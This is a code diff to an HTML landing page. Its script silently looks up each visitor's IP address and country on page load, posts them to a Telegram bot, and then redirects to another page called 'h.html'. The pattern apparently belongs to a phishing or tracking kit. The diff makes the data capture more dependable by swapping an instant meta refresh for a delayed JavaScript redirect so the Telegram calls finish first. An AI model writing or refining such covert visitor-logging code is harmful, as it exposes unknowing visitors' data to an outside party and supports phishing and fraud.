@@ -8,7 +8,6 @@
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
-    <meta http-equiv="refresh" content="0;url=h.html">
     <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
     <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
@@ -26,7 +25,7 @@
         // Function to send message to Telegram
         function sendTelegramMessage(message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            fetch(url, {
+            return fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -37,7 +36,17 @@
                     parse_mode: 'Markdown'
                 })
             })
-            .catch(error => console.error('Error sending Telegram message:', error));
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Telegram API error:', data);
+                } else {
+                    console.log('Telegram message sent successfully');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending Telegram message:', error);
+            });
         }
 
         // Function to get IP and country
@@ -47,10 +56,17 @@
                 const ip = data.ip || 'Unknown IP';
                 const country = data.country_name || 'Unknown Country';
                 const message = `*New Visit to Page*\nIP: ${ip}\nCountry: ${country}`;
-                sendTelegramMessage(message);
+                return sendTelegramMessage(message);
             })
             .catch(error => {
-                sendTelegramMessage('*New Visit to Page*\nIP: Unknown\nCountry: Unknown');
+                console.error('Error fetching IP data:', error);
+                return sendTelegramMessage('*New Visit to Page*\nIP: Unknown\nCountry: Unknown');
+            })
+            .finally(() => {
+                // Redirect after 1 second to ensure API calls complete
+                setTimeout(() => {
+                    window.location.href = 'h.html';
+                }, 1000);
             });
     </script>
 </head>
